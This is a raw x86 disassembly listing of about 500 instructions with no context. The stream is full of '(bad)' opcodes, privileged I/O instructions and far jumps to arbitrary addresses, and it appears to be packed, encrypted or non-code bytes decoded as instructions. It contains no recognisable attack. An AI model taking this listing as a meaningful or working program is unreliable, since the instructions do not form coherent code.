  413ecf:	test   BYTE PTR [ebp+0x4bfd6ce9],dl
  413ed5:	leave  
  413ed6:	push   ecx
  413ed7:	push   es
  413ed8:	add    DWORD PTR [edi+0x26],ebp
  413edb:	push   0x19
  413edd:	xchg   esi,eax
  413ede:	mov    edx,0xe46383d
  413ee3:	or     BYTE PTR [esi],bl
  413ee5:	push   ds
  413ee6:	push   ds
  413ee7:	mov    ah,0xfb
  413ee9:	pop    esp
  413eea:	sub    al,0x2c
  413eec:	in     al,dx
  413eed:	xor    BYTE PTR [ebx+0x7d87e75],bh
  413ef3:	dec    eax
  413ef4:	mov    dl,0x70
  413ef6:	jmp    0x26b5:0x16bf4ba
  413efd:	js     0x413eda
  413eff:	fidivr WORD PTR [edx]
  413f01:	ins    BYTE PTR es:[edi],dx
  413f02:	add    al,0xfa
  413f04:	in     eax,dx
  413f05:	ss ret 
  413f07:	sub    DWORD PTR [ecx-0x45f08838],esi
  413f0d:	xchg   ebp,eax
  413f0e:	dec    edi
  413f0f:	mov    ecx,0x10cfd07f
  413f14:	pop    eax
  413f15:	sbb    al,0x16
  413f17:	out    dx,al
  413f18:	xchg   esi,eax
  413f19:	xor    BYTE PTR [esi+eiz*1-0x68],bh
  413f1d:	jns    0x413f33
  413f1f:	ja     0x413ead
  413f21:	pop    ebx
  413f22:	or     al,0xc9
  413f24:	sub    esi,esi
  413f26:	std    
  413f27:	sbb    bh,BYTE PTR [edx]
  413f29:	pop    eax
  413f2a:	mov    bl,0xa8
  413f2c:	add    edi,edi
  413f2e:	fist   DWORD PTR [ecx+0x7dd3fcfe]
  413f34:	pusha  
  413f35:	test   BYTE PTR [esi],0xb1
  413f38:	mov    bl,0xa9
  413f3a:	fwait
  413f3b:	push   0xffa797ca
  413f40:	ins    BYTE PTR es:[edi],dx
  413f41:	xchg   ebx,eax
  413f42:	jmp    DWORD PTR [ebx]
  413f44:	cmc    
  413f45:	das    
  413f46:	ins    DWORD PTR es:[edi],dx
  413f47:	xor    edx,DWORD PTR [esi-0x6]
  413f4a:	jle    0x413f66
  413f4c:	into   
  413f4d:	mov    ds:0x32a8ad2a,eax
  413f52:	pop    eax
  413f53:	xchg   DWORD PTR [edi+0x285d612f],eax
  413f59:	dec    edi
  413f5a:	adc    BYTE PTR [ecx],bh
  413f5c:	push   eax
  413f5d:	sbb    BYTE PTR [ebp-0x15380d79],dh
  413f63:	lods   al,BYTE PTR ds:[esi]
  413f64:	dec    eax
  413f65:	ins    BYTE PTR es:[edi],dx
  413f66:	push   ds
  413f67:	cmc    
  413f68:	pop    eax
  413f69:	gs xchg ebp,eax
  413f6b:	pop    ebx
  413f6c:	add    eax,0x99da3927
  413f71:	sbb    bl,al
  413f73:	jb     0x413f55
  413f75:	int3   
  413f76:	inc    eax
  413f77:	fs ret 0xc7f7
  413f7b:	jp     0x413fd8
  413f7d:	shl    DWORD PTR [eax-0x62],cl
  413f80:	ja     0x413f54
  413f82:	mov    DWORD PTR [esi+0x5d],0xe153554
  413f89:	fmul   st(7),st
  413f8b:	loope  0x413f18
  413f8d:	(bad)
  413f91:	int    0x7b
  413f93:	arpl   WORD PTR [eax],cx
  413f95:	std    
  413f96:	mov    ds:0x7b659c24,al
  413f9b:	jne    0x413fe1
  413f9d:	sbb    DWORD PTR [ebx-0x205f287],ebp
  413fa3:	push   ebx
  413fa4:	jg     0x413f68
  413fa6:	cmp    edx,DWORD PTR [esi-0x1b]
  413fa9:	inc    ebx
  413faa:	test   al,0x60
  413fac:	xchg   ebx,eax
  413fad:	mov    esi,0x8a159e2a
  413fb2:	lods   al,BYTE PTR ds:[esi]
  413fb3:	or     al,0x48
  413fb5:	or     cl,BYTE PTR ds:[ebx-0x131a4ea1]
  413fbc:	popf   
  413fbd:	mov    ebx,0xc2ee1f10
  413fc2:	xor    BYTE PTR [edi],dl
  413fc4:	mov    dl,0xd7
  413fc6:	int    0xbc
  413fc8:	clc    
  413fc9:	xchg   ebx,eax
  413fca:	je     0x414022
  413fcc:	scas   eax,DWORD PTR es:[edi]
  413fcd:	xchg   esp,eax
  413fce:	pop    ebx
  413fcf:	stos   BYTE PTR es:[edi],al
  413fd0:	add    eax,0x714b7f72
  413fd5:	push   ebx
  413fd6:	add    eax,0x6c17662b
  413fdb:	xchg   ebx,eax
  413fdc:	dec    esp
  413fdd:	enter  0x983b,0xbc
  413fe1:	inc    ebx
  413fe2:	xor    eax,0x5814add3
  413fe7:	js     0x41402a
  413fe9:	push   cs
  413fea:	adc    DWORD PTR [eax],esp
  413fec:	jmp    0xd19f:0xcc6c39ce
  413ff3:	outs   dx,BYTE PTR ds:[esi]
  413ff4:	mov    DWORD PTR [edi+ecx*4-0x700722f1],edx
  413ffb:	pushf  
  413ffc:	repnz xor BYTE PTR [ebp+0x6820564d],bl
  414003:	sbb    DWORD PTR es:[ebx-0x43eccd6c],ebx
  41400a:	lods   al,BYTE PTR ds:[esi]
  41400b:	sub    eax,0x7f698885
  414010:	test   DWORD PTR [edi+0x46c29e96],eax
  414016:	mov    dh,BYTE PTR ds:0xc9308d04
  41401c:	xchg   ecx,eax
  41401d:	adc    al,0x8a
  41401f:	push   0x44
  414021:	loop   0x41404a
  414023:	imul   ebp,DWORD PTR [ebx],0x7e
  414026:	and    cl,BYTE PTR [ecx+0x1b9d885f]
  41402c:	hlt    
  41402d:	or     esp,DWORD PTR [esi+eiz*2+0x66]
  414031:	mov    esp,0xa7edea63
  414036:	rcl    BYTE PTR [edi],cl
  414038:	mov    eax,0xe5ae9f1b
  41403d:	popa   
  41403e:	pop    ecx
  41403f:	xchg   DWORD PTR [ecx-0x44],esi
  414042:	ds popa 
  414044:	mov    ds:0x1cad53a1,al
  414049:	(bad)  
  41404a:	pushf  
  41404b:	add    DWORD PTR [eax+esi*2-0x2f],ebx
  41404f:	(bad)  
  414050:	ror    DWORD PTR [edi],1
  414052:	sbb    bh,al
  414054:	(bad)  
  414055:	cmc    
  414056:	sbb    BYTE PTR [esi+0x6c],dl
  414059:	mov    dh,0x4a
  41405b:	test   BYTE PTR fs:[ebp-0xf35c017],ah
  414062:	xor    DWORD PTR [edx-0x48],ebx
  414065:	leave  
  414066:	mov    ebp,0xfed5a3b9
  41406b:	jge    0x414057
  41406d:	cmp    dl,ch
  41406f:	stc    
  414070:	or     BYTE PTR [ecx+edx*1-0x7c],0x85
  414075:	je     0x4140cd
  414077:	(bad)  
  414078:	mov    esp,0xa22386b
  41407d:	jp     0x4140f9
  41407f:	pop    eax
  414080:	xor    al,0x1
  414082:	jo     0x41401a
  414084:	cs jle 0x4140f7
  414087:	push   ss
  414088:	inc    ecx
  414089:	fiadd  DWORD PTR [ecx-0x18]
  41408c:	cmp    ch,cl
  41408e:	ss int 0x1
  414091:	and    eax,0xe22aca44
  414096:	xchg   esi,eax
  414097:	mov    ebx,0xd8f8a9ca
  41409c:	push   ss
  41409d:	pop    eax
  41409e:	mov    dl,BYTE PTR [ebx]
  4140a0:	call   0xe3feb509
  4140a5:	mov    esp,DWORD PTR [ecx+0x5d]
  4140a8:	cmp    DWORD PTR [esp+eax*1-0x2f518b6c],ebp
  4140af:	xchg   ecx,eax
  4140b0:	popa   
  4140b1:	rcr    dh,cl
  4140b3:	push   cs
  4140b4:	add    edi,DWORD PTR [ecx+0x65bd409]
  4140ba:	jmp    0xef931041
  4140bf:	daa    
  4140c0:	test   eax,0xbdf0460c
  4140c5:	fld    DWORD PTR [edi]
  4140c7:	cli    
  4140c8:	mov    ebx,0xc2210d38
  4140cd:	jae    0x41408c
  4140cf:	(bad)  
  4140d0:	test   al,0xf5
  4140d2:	pop    eax
  4140d3:	out    0xde,eax
  4140d5:	push   ebx
  4140d6:	dec    ebx
  4140d7:	inc    esp
  4140d9:	sbb    BYTE PTR [ebp+ebp*4+0x57],dl
  4140dd:	(bad)  
  4140de:	js     0x414143
  4140e0:	pop    esp
  4140e1:	loope  0x41414d
  4140e3:	and    ah,bl
  4140e5:	lea    esp,[ebx+0xc690ecc]
  4140eb:	fidiv  WORD PTR [ebx-0x7e]
  4140ee:	std    
  4140ef:	cmp    BYTE PTR [ecx+0x42],bl
  4140f2:	lahf   
  4140f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140f4:	popa   
  4140f5:	push   0x2
  4140f7:	test   DWORD PTR [ebp-0x6e],esi
  4140fa:	repnz das 
  4140fc:	jp     0x414166
  4140fe:	push   0xffffffe1
  414100:	cmp    eax,0xddfc89c6
  414105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414106:	mov    BYTE PTR [eax],al
  414108:	mov    gs,WORD PTR [ebx-0x59325043]
  41410e:	pusha  
  41410f:	sbb    DWORD PTR [eax-0x60d46e72],0xffffff81
  414116:	push   ss
  414117:	(bad)  [eax+edx*2]
  41411a:	into   
  41411b:	shl    DWORD PTR [edx-0x7e],0x80
  41411f:	jns    0x4140a9
  414121:	or     eax,0xc6306545
  414126:	jmp    0x60f40e20
  41412b:	xor    BYTE PTR [esi+edi*4+0xb328a4c],0xdf
  414133:	jno    0x41419b
  414135:	dec    esp
  414136:	out    0x3a,al
  414138:	xchg   dl,dl
  41413a:	mov    eax,ds:0x792e3a3
  41413f:	ret    0x9b6d
  414142:	addr16 cs cmc 
  414145:	mov    dh,BYTE PTR [ebx+ebp*1]
  414148:	icebp  
  414149:	loope  0x4141c1
  41414b:	xor    ecx,esp
  41414d:	shl    DWORD PTR [ecx-0x22],1
  414150:	sbb    dl,dl
  414152:	sbb    al,0xf2
  414154:	ror    DWORD PTR [edx],cl
  414156:	pop    ebp
  414157:	jmp    0x41416c
  414159:	cld    
  41415a:	inc    ebx
  41415b:	outs   dx,BYTE PTR ds:[esi]
  41415c:	xchg   ebx,eax
  41415d:	mov    esi,0xde5b3b6a
  414162:	(bad)  
  414163:	xchg   ecx,eax
  414164:	loop   0x4140fa
  414166:	pop    ss
  414167:	retf   0x5023
  41416a:	xchg   esi,eax
  41416b:	and    esp,DWORD PTR [ecx+0x2857f1b2]
  414171:	das    
  414172:	cmp    eax,0x910ccfc6
  414177:	dec    esp
  414178:	je     0x4141a3
  41417a:	rcl    BYTE PTR [ecx+0x39c893d5],cl
  414180:	mov    ?,WORD PTR [ebx+0x77]
  414183:	dec    edi
  414184:	push   ebp
  414185:	lds    esi,FWORD PTR [eax+0x68c81ca6]
  41418b:	and    eax,DWORD PTR [edx+0x2b]
  41418e:	cmc    
  41418f:	cmp    ch,BYTE PTR [eax+esi*8-0x28]
  414193:	aaa    
  414194:	fnstcw WORD PTR [edi+0x72]
  414197:	(bad)  
  414198:	xchg   ebp,eax
  414199:	or     eax,0x36ccd16d
  41419e:	dec    edx
  41419f:	lods   al,BYTE PTR ds:[esi]
  4141a0:	cmc    
  4141a1:	mov    esi,0xd0ba0e11
  4141a6:	mov    esi,0x9ca50582
  4141ab:	mov    dl,0x4a
  4141ad:	mov    ds,WORD PTR [eax]
  4141af:	(bad)  
  4141b0:	pop    eax
  4141b1:	por    mm5,mm6
  4141b4:	test   eax,0x2dd3f426
  4141b9:	repnz sbb eax,0x37be136d
  4141bf:	add    al,BYTE PTR [esi+0x1f]
  4141c2:	ror    DWORD PTR [ebx-0x55],cl
  4141c5:	pop    ebp
  4141c6:	push   cs
  4141c7:	in     eax,0xa4
  4141c9:	or     al,BYTE PTR [ebp+0x6b933cec]
  4141cf:	push   edx
  4141d0:	sub    DWORD PTR ss:[edi+0x4b341e3e],esp
  4141d7:	push   edi
  4141d8:	and    BYTE PTR [ecx],ah
  4141da:	(bad)  
  4141db:	stos   BYTE PTR es:[edi],al
  4141dc:	imul   ecx,DWORD PTR [esi-0x5f],0x5bd4568a
  4141e3:	or     al,0x4
  4141e5:	sub    DWORD PTR [eax+ebp*8-0x6c5a655d],0xffffffc3
  4141ed:	bound  ebp,QWORD PTR ds:0xc60628b4
  4141f3:	scas   eax,DWORD PTR es:[di]
  4141f5:	bound  esi,QWORD PTR [ebx]
  4141f7:	in     eax,0xf9
  4141f9:	outs   dx,BYTE PTR ds:[esi]
  4141fa:	pop    es
  4141fb:	pop    ds
  4141fc:	lahf   
  4141fd:	daa    
  4141fe:	pop    ecx
  4141ff:	retf   
  414200:	sbb    esp,DWORD PTR [eax+0x11]
  414203:	dec    edx
  414204:	int3   
  414205:	icebp  
  414206:	jnp    0x41422f
  414208:	jno    0x414225
  41420a:	jno    0x41423d
  41420c:	add    DWORD PTR [ebp-0x30],0x400f75fd
  414213:	xor    edx,DWORD PTR [edi+0x5478e59b]
  414219:	mov    ebx,0x3192e408
  41421e:	sar    BYTE PTR [ebp-0x3fc1a3e1],cl
  414224:	or     al,0x1d
  414226:	rol    BYTE PTR [edx],0xdd
  414229:	(bad)  
  41422a:	jne    0x41424d
  41422c:	loopne 0x4141c5
  41422e:	popf   
  41422f:	xchg   ebx,eax
  414230:	shl    BYTE PTR [ecx],1
  414232:	addr16 jg 0x4141bb
  414235:	dec    esp
  414236:	mov    bl,0xb5
  414238:	mov    ecx,0xd842aebd
  41423d:	ds pusha 
  41423f:	ds dec esi
  414241:	loop   0x4141e6
  414243:	mov    edx,0xf4682f9f
  414248:	sahf   
  414249:	jo     0x41420c
  41424b:	fiadd  WORD PTR [edi+0x1f]
  41424e:	xchg   ebp,eax
  41424f:	sbb    edx,DWORD PTR [eax]
  414251:	sub    eax,0xc29a1613
  414256:	in     al,dx
  414257:	fdivrp st(2),st
  414259:	xchg   BYTE PTR [ebp+0x37ede4a0],ch
  41425f:	nop
  414260:	jmp    0x4141ec
  414262:	fisttp DWORD PTR [edi-0x6f47a52e]
  414268:	icebp  
  414269:	(bad)  
  41426a:	les    edx,FWORD PTR [ebx+0x41]
  41426d:	cmp    BYTE PTR [ecx],dh
  41426f:	jmp    0x75067338
  414274:	loop   0x414299
  414276:	jmp    0xb7b5387e
  41427b:	pop    es
  41427c:	stc    
  41427d:	je     0x414267
  41427f:	xchg   esi,eax
  414280:	mov    esp,0x11867ac3
  414285:	(bad)  
  414286:	or     ecx,DWORD PTR [ecx-0xb0d7a5]
  41428c:	sti    
  41428d:	cmc    
  41428e:	ss mov dh,0x2a
  414291:	mov    ebp,0xac5ce67a
  414296:	push   ss
  414297:	pop    esp
  414298:	xchg   edi,eax
  414299:	or     BYTE PTR [edx+eax*8-0x414285f0],bh
  4142a0:	(bad)  
  4142a1:	lods   eax,DWORD PTR ds:[esi]
  4142a2:	add    eax,0x8d8081a9
  4142a7:	in     al,dx
  4142a8:	iret   
  4142a9:	clc    
  4142aa:	sub    DWORD PTR [eax],ebx
  4142ac:	sbb    DWORD PTR [edx-0x1c4549d6],ebx
  4142b2:	pop    ds
  4142b3:	or     DWORD PTR [eax+ecx*8],edi
  4142b6:	fld    TBYTE PTR [edx-0x53]
  4142b9:	sub    al,0xf9
  4142bb:	jne    0x414255
  4142bd:	push   ss
  4142be:	aaa    
  4142bf:	or     DWORD PTR [eax],0xffffffaa
  4142c2:	stos   DWORD PTR es:[edi],eax
  4142c3:	call   0xb1b6:0xd700a186
  4142ca:	das    
  4142cb:	xlat   BYTE PTR ds:[ebx]
  4142cc:	popa   
  4142cd:	outs   dx,DWORD PTR ds:[esi]
  4142ce:	xor    eax,0x55cd7314
  4142d3:	and    cl,BYTE PTR [ecx-0x2]
  4142d6:	outs   dx,DWORD PTR ds:[esi]
  4142d7:	pop    dx
  4142d9:	pop    ecx
  4142da:	adc    eax,0xd7eff8e
  4142df:	cmp    bl,bh
  4142e1:	fdiv   QWORD PTR [ebp+0x7f]
  4142e4:	jmp    DWORD PTR [eax]
  4142e6:	inc    ecx
  4142e7:	int3   
  4142e8:	mov    esp,0x25cc9bb7
  4142ed:	inc    edi
  4142ee:	jne    0x4142d1
  4142f0:	or     esp,DWORD PTR [ebp+eax*2-0x79e25b2f]
  4142f7:	and    BYTE PTR [esp+eax*2-0x2f],bl
  4142fb:	and    BYTE PTR [eax-0x15295ed9],0xe6
  414302:	mov    eax,0x50756607
  414307:	aaa    
  414308:	out    dx,al
  414309:	pop    esp
  41430a:	add    ah,BYTE PTR [esi-0x40]
  41430d:	mov    eax,0xe78beee5
  414312:	xor    BYTE PTR [esi+0x362d77c0],ch
  414318:	enter  0xa407,0xe4
  41431c:	push   ecx
  41431d:	rcl    BYTE PTR [edx+0x7a647bbe],0x82
  414324:	in     al,dx
  414325:	add    DWORD PTR [ecx],esi
  414327:	aam    0xd7
  414329:	jle    0x4142e4
  41432b:	lods   eax,DWORD PTR ds:[esi]
  41432c:	xchg   ebx,eax
  41432d:	jl     0x4142fa
  41432f:	sub    dl,al
  414331:	inc    eax
  414332:	lea    ecx,es:[eax+ebp*2+0xb9e8980]
  41433a:	pop    es
  41433b:	scas   al,BYTE PTR es:[edi]
  41433c:	or     ch,BYTE PTR [edi-0x31]
  41433f:	test   DWORD PTR [ebp-0x47750c0a],ebx
  414345:	test   DWORD PTR [ebp+0x7f],0x22716c9
  41434c:	rcl    eax,0x1f
  41434f:	mov    dl,0xa3
  414351:	dec    eax
  414352:	mov    ch,0xe7
  414354:	popf   
  414355:	into   
  414356:	inc    esi
  414357:	mov    ebx,0x572fbaeb
  41435c:	add    ebx,ebp
  41435e:	or     ebx,edi
  414360:	arpl   bx,dx
  414362:	stos   BYTE PTR es:[edi],al
  414363:	cdq    
  414364:	jb     0x414322
  414366:	hlt    
  414367:	ins    BYTE PTR es:[edi],dx
  414368:	sbb    ebx,DWORD PTR [ecx+ebx*1-0x6]
  41436c:	retf   
  41436d:	cld    
  41436e:	popf   
  41436f:	fst    DWORD PTR [edi]
  414371:	lods   eax,DWORD PTR ds:[esi]
  414372:	mov    dl,0x33
  414374:	cli    
  414375:	pop    edx
  414376:	(bad)  
  414377:	call   0x3404:0x1037632d
  41437e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41437f:	aam    0x66
  414381:	(bad)  
  414382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414383:	adc    ebx,DWORD PTR cs:[ebx+edi*1]
  414387:	je     0x4143a3
  414389:	jnp    0x41435b
  41438b:	invd   
  41438d:	into   
  41438e:	mov    edx,0x1237ab60
  414393:	out    0x40,eax
  414395:	adc    eax,0xa625bbeb
  41439a:	rcl    BYTE PTR [edx+ebx*8-0x7994a60f],0x4a
  4143a2:	jnp    0x41435d
  4143a4:	cmovl  edi,ebp
  4143a7:	or     al,0x8c
  4143a9:	mov    edx,?
  4143ab:	call   0x7fb2e5e3
  4143b0:	dec    ecx
  4143b1:	inc    esi
  4143b2:	ins    DWORD PTR es:[edi],dx
  4143b3:	jle    0x41437f
  4143b5:	mov    esi,0xcbe35ddf
  4143ba:	cwde   
  4143bb:	int3   
  4143bc:	sub    dl,BYTE PTR [esi-0x43]
  4143bf:	or     BYTE PTR [eax],dh
  4143c1:	pop    ss
  4143c2:	xchg   ecx,eax
  4143c3:	pop    ds
  4143c4:	xchg   esp,eax
  4143c5:	dec    edi
  4143c6:	pushf  
  4143c7:	add    ecx,edx
  4143c9:	adc    al,0x37
  4143cb:	mov    edx,0xe689df7f
  4143d0:	fidiv  WORD PTR [edx-0x799bfbff]
  4143d6:	and    DWORD PTR [esp+edx*8-0x79],eax
  4143da:	cmp    cl,BYTE PTR [ecx]
  4143dc:	pcmpgtd mm0,QWORD PTR ds:0x39bb9ca7
  4143e3:	sbb    DWORD PTR [ebx-0x43],esi
  4143e6:	loopne 0x414460
  4143e8:	dec    eax
  4143e9:	push   ebx
  4143ea:	data16 ins BYTE PTR es:[edi],dx
  4143ec:	outs   dx,BYTE PTR ds:[esi]
  4143ed:	leave  
  4143ee:	adc    al,0x18
  4143f0:	mov    ebx,0xd1e27637
  4143f5:	add    al,0x81
  4143f7:	les    esp,FWORD PTR [ebp-0x49c040ce]
  4143fd:	sub    BYTE PTR [edi+ecx*8],cl
  414400:	xchg   BYTE PTR [edi-0x31e6543b],bh
  414406:	add    ecx,DWORD PTR [ebp+0x1f595aff]
  41440c:	or     DWORD PTR [edx-0x79],esp
  41440f:	daa    
  414410:	xor    BYTE PTR [ebx-0x6e],al
  414413:	push   cs
  414414:	loop   0x4143c6
  414416:	es jmp 0x5807b836
  41441c:	pop    es
  41441d:	pop    ds
  41441e:	loop   0x4143f2
  414420:	imul   ebp,DWORD PTR [edi],0x8acd3aa9
  414426:	aaa    
  414427:	ret    
  414428:	or     DWORD PTR [esp+esi*8],ebp
  41442b:	jl     0x41446f
  41442d:	jne    0x41446e
  41442f:	cld    
  414430:	and    DWORD PTR [esi],eax
  414432:	lock or BYTE PTR [ecx],bl
  414435:	(bad)  
  414436:	mov    BYTE PTR [ecx],bl
  414438:	cmp    ebx,DWORD PTR [edi]
  41443a:	sbb    ecx,DWORD PTR [ebp+0x475519c1]
  414440:	(bad)  
  414442:	sub    BYTE PTR [edx+0x4ff1769b],bh
  414448:	and    dl,cl
  41444a:	icebp  
  41444b:	(bad)  
  41444c:	loopne 0x414404
  41444e:	jbe    0x4144a7
  414450:	ins    BYTE PTR es:[edi],dx
  414451:	push   ebp
  414452:	sbb    edx,DWORD PTR [eax-0x1ecde722]
  414458:	neg    BYTE PTR [ebx-0x35]
  41445b:	or     al,0x37
  41445d:	sub    DWORD PTR ds:0xa064ffd1,edx
  414463:	pop    edx
  414464:	js     0x414481
  414466:	jmp    0x414484
  414468:	scas   eax,DWORD PTR es:[edi]
  414469:	retf   
  41446a:	loope  0x4144a4
  41446c:	or     BYTE PTR [edx+0x47],al
  41446f:	call   DWORD PTR [esi+eiz*2]
  414472:	aas    
  414473:	sti    
  414474:	mov    fs,WORD PTR [ecx+0x5ccd28e1]
  41447a:	sbb    ebx,edi
  41447c:	mov    bl,0x4b
  41447e:	loope  0x4144dc
  414480:	mov    eax,0x87a17c7a
  414485:	aaa    
  414486:	sub    ah,BYTE PTR [ebp-0x71396380]
  41448c:	pushf  
  41448d:	mov    ebx,0xdbe4f53e
  414492:	lds    edi,FWORD PTR gs:[edx]
  414495:	mov    cs,WORD PTR [eax+0x53]
  414498:	mov    eax,ds:0x392574b3
  41449d:	xor    DWORD PTR [edi-0x5b],edx
  4144a0:	mov    eax,0x77a3b1f5
  4144a5:	scas   al,BYTE PTR es:[edi]
  4144a6:	push   0x925a7c14
  4144ab:	pusha  
  4144ac:	mov    ch,dh
  4144ae:	ret    
  4144af:	lods   eax,DWORD PTR ds:[esi]
  4144b0:	enter  0x82f9,0xc1
  4144b4:	and    eax,0xeff2dba2
  4144b9:	stos   BYTE PTR es:[edi],al
  4144ba:	imul   ebx,DWORD PTR [esi-0x7978c11c],0xffffffe3
  4144c1:	into   
  4144c2:	scas   al,BYTE PTR es:[edi]
  4144c3:	data16 or dh,bl
  4144c6:	xchg   BYTE PTR [ebp-0x47],dl
  4144c9:	dec    edi
  4144ca:	xchg   BYTE PTR [eax+eiz*2],bh
  4144cd:	in     al,0x91
  4144cf:	pop    sp
  4144d1:	sbb    al,0xec
  4144d3:	stos   BYTE PTR es:[edi],al
  4144d4:	sbb    al,0xb2
  4144d6:	add    DWORD PTR [eax-0x36ab04c1],ecx
  4144dc:	mov    edi,0x6360b1d1
  4144e1:	add    ecx,DWORD PTR [ecx]
  4144e3:	cmp    BYTE PTR [ebx+0x4e],dl
  4144e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144e7:	xchg   DWORD PTR [esi],ebx
  4144e9:	add    al,0x1
  4144eb:	(bad)  
  4144ec:	sbb    edx,ecx
  4144ee:	iret   
  4144ef:	mov    dl,0xf2
  4144f1:	call   0xef82fef
  4144f6:	std    
  4144f7:	jl     0x4144ec
  4144f9:	daa    
  4144fa:	lock add ah,BYTE PTR es:[esi-0x7b526503]
  414502:	fadd   QWORD PTR [ebx+0x3c]
  414505:	stos   BYTE PTR es:[edi],al
  414506:	sbb    eax,ecx
  414508:	mov    ecx,DWORD PTR [eax-0x1a]
  41450b:	or     eax,0xab9f4d2a
  414510:	fbstp  TBYTE PTR [ebx]
  414512:	cli    
  414513:	and    BYTE PTR [ebx+0x519b818e],0x10
  41451a:	sub    BYTE PTR [esi+edi*1],0x5c
  41451e:	in     eax,0xe
  414520:	xor    al,0x5a
  414522:	cld    
  414523:	push   eax
  414524:	scas   eax,DWORD PTR es:[edi]
  414525:	cmp    eax,0x9fe1548e
  41452a:	rcl    DWORD PTR [eax],1
  41452c:	into   
  41452d:	xor    esi,0xffffffba
  414530:	aaa    
  414531:	mov    ds:0xcba6e4f8,eax
  414536:	mov    WORD PTR es:[esi+0x3],?
  41453a:	shl    BYTE PTR [edx],cl
  41453c:	ss ja  0x414576
  41453f:	or     ebp,DWORD PTR [ebx+eiz*1-0x32]
  414543:	xchg   edi,eax
  414544:	pop    edx
  414545:	(bad)  
  414546:	mov    ch,0x5
  414548:	fdiv   DWORD PTR fs:[ebx+0x129ad307]
  41454f:	jle    0x4144e6
  414551:	mov    edi,0x9f0a5910
  414556:	adc    ch,dh
  414558:	es jle 0x414519
  41455b:	or     al,0x8d
  41455d:	dec    ebp
  41455e:	ins    BYTE PTR es:[edi],dx
  41455f:	lea    edx,[edi+0x3f91025c]
  414565:	sbb    eax,DWORD PTR [eax+0x9]
  414568:	(bad)  
  414569:	aad    0x90
  41456b:	and    ebx,DWORD PTR [ebx+0xc]
  41456e:	inc    eax
  41456f:	rcr    DWORD PTR [ecx],0x62
  414572:	jns    0x41457f
  414574:	mov    dh,0x4e
  414576:	fild   QWORD PTR [ebp-0x6adfa01b]
  41457c:	mov    edi,gs
  41457e:	cmp    eax,0x3b648996
  414583:	rcr    BYTE PTR [edi],cl
  414585:	gs inc esp
  414587:	jle    0x414604
  414589:	clc    
  41458a:	adc    BYTE PTR [edi],ch
  41458c:	jne    0x414527
  41458e:	inc    eax
  41458f:	xor    DWORD PTR [edx+0x74],edx
  414592:	dec    esi
  414593:	inc    ecx
  414594:	xor    BYTE PTR [eax+0x504a0064],bh
  41459a:	push   ss
  41459b:	mov    edx,0x9c00b3c3
  4145a0:	inc    edi
  4145a1:	fstp   TBYTE PTR [ebx+ebx*4]
  4145a4:	call   0xde6fd385
  4145a9:	outs   dx,DWORD PTR ds:[esi]
  4145aa:	fcmovnb st,st(0)
  4145ac:	push   ebx
  4145ad:	sbb    ebp,DWORD PTR [ebx]
  4145af:	call   0x6761:0x57d8af98
  4145b6:	test   DWORD PTR [edx+0x2ce6d912],0xc744be02
  4145c0:	cmp    eax,0xc0d45066
  4145c5:	xor    BYTE PTR [ebp-0x16],ch
  4145c8:	xor    eax,0x613056d7
  4145cd:	shl    ch,1
  4145cf:	push   ebp
  4145d0:	mov    WORD PTR [esi-0x74],ds
  4145d3:	enter  0x9157,0x57
  4145d7:	dec    ecx
  4145d8:	push   ebp
  4145d9:	aam    0xd9
  4145db:	(bad)  
  4145dc:	sti    
  4145dd:	mul    DWORD PTR [ebx+0x2a14e030]
  4145e3:	mov    eax,ds:0xd1fc88a9
  4145e8:	xchg   ebx,eax
  4145e9:	pop    esp
  4145ea:	jae    0x4145ec
  4145ec:	popa   
  4145ed:	push   cs
  4145ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145ef:	jmp    FWORD PTR [edi]
  4145f1:	retf   0x56f5
  4145f4:	pop    ebx
  4145f5:	shl    eax,1
  4145f7:	adc    esp,DWORD PTR ds:0xe5a99d75
  4145fd:	push   cs
  4145fe:	addr16 hlt 
  414600:	xchg   ecx,eax
  414601:	ins    BYTE PTR es:[edi],dx
  414602:	retf   0x5754
  414605:	lods   eax,DWORD PTR ds:[esi]
  414606:	fst    st(0)
  414608:	ja     0x4145f0
  41460a:	mov    cl,0x7e
  41460c:	test   al,0x3d
  41460e:	jns    0x414613
  414610:	hlt    
  414611:	gs xor edx,eax
  414614:	push   ds
  414615:	bound  ecx,QWORD PTR [edi-0x5e]
  414618:	pop    edi
  414619:	add    bh,BYTE PTR [ebp+0x2f]
  41461c:	jl     0x41463a
  41461e:	int    0x6d
  414620:	fistp  DWORD PTR [edi+ebp*2-0xcea4364]
  414627:	mov    edi,0xf02a4b90
  41462c:	bound  eax,QWORD PTR [ebp+0x2e5f2b54]
  414632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414633:	mov    esp,DWORD PTR [esi-0x55]
  414636:	in     al,0xe4
  414638:	mov    ebp,0x9f123425
  41463d:	ss retf 
  41463f:	and    DWORD PTR [eax+0x1c],0x73eca8bc
  414646:	sbb    ch,BYTE PTR [edi]
  414648:	ins    DWORD PTR es:[edi],dx
  414649:	lea    esp,[ebx-0x28cd55ef]
  41464f:	push   eax
  414650:	push   ds
  414651:	mov    ds:0x70a8f13e,eax
  414656:	push   ebp
  414657:	outs   dx,DWORD PTR ds:[esi]
  414658:	fbstp  TBYTE PTR [ecx+0x30d643a2]
  41465e:	push   edi
  41465f:	and    esi,DWORD PTR [ebp+0x47]
  414662:	sbb    ch,BYTE PTR [ecx-0x612554bf]
  414668:	jge    0x414697
  41466a:	xchg   ecx,eax
  41466b:	mov    eax,0x5d1e71b2
  414670:	xor    eax,0xbb33a5f0
  414675:	adc    dh,al
  414677:	pop    es
  414678:	addr16 mov ebx,0x6544b8bc
  41467e:	inc    esi
  41467f:	mov    cl,0xf
  414681:	jecxz  0x414642
  414683:	int    0x75
  414685:	hlt    
  414686:	push   edi
  414687:	cmp    al,0xc6
  414689:	aam    0x55
  41468b:	cs pop esi
  41468d:	sub    DWORD PTR [eax],edi
  41468f:	or     esi,ecx
  414691:	js     0x414627
  414693:	mov    BYTE PTR [edx],bl
  414695:	jmp    0x4146f0
  414697:	sar    DWORD PTR [esi-0x42418989],cl
  41469d:	mov    ds:0x7884c8ef,eax
  4146a2:	jmp    0xc86724fe
  4146a7:	leave  
  4146a8:	jmp    0x6a94f5
  4146ad:	jp     0x414708
